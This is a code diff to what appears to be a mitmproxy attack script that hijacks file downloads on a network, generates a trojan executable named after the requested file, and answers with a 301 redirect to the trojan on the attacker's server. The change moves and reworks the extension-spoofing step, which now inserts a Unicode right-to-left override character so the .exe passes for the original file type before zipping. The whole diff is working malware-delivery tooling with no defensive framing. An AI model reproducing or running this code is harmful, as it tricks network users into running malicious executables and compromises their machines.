@@ -16,8 +16,13 @@ def request(flow):
 		print("[+] Got interesting flow")
 
 		front_file_name = flow.request.pretty_url.split("/")[-1].split(".")[0]
+		front_file_extension = flow.request.pretty_url.split("/")[-1].split(".")[-1]
+
 		front_file = flow.request.pretty_url + "#"
 		download_file_name = front_file_name + ".exe"
+		if SPOOF_EXTENSION and front_file_extension != "exe":
+			print("[+] Renaming trojan to spoof its extension")
+			download_file_name = front_file_name + "\u202E" + "".join(reversed(front_file_extension))  + ".exe"
 		trojan_file = WEB_ROOT + download_file_name
 
 		print("[+] Generating a trojan for " + flow.request.pretty_url)
@@ -27,15 +32,8 @@ def request(flow):
 		trojan.compile()
 
 		if SPOOF_EXTENSION:
-			print("[+] Renaming trojan to spoof its extension")
-			front_file_extension = flow.request.pretty_url.split("/")[-1].split(".")[-1]
-			if front_file_extension != "exe":
-				new_name = front_file_name + "".join(reversed(front_file_extension))  + ".exe"
-				spoofed_file = WEB_ROOT + new_name
-				os.rename(trojan_file, spoofed_file)
-
-				trojan.zip(spoofed_file)
-				download_file_name = front_file_name + ".zip"
+			trojan.zip(trojan_file)
+			download_file_name = front_file_name + ".zip"
 
 		trojan_download_url = "http://" + IP + "/" + download_file_name
 		flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location": trojan_download_url})
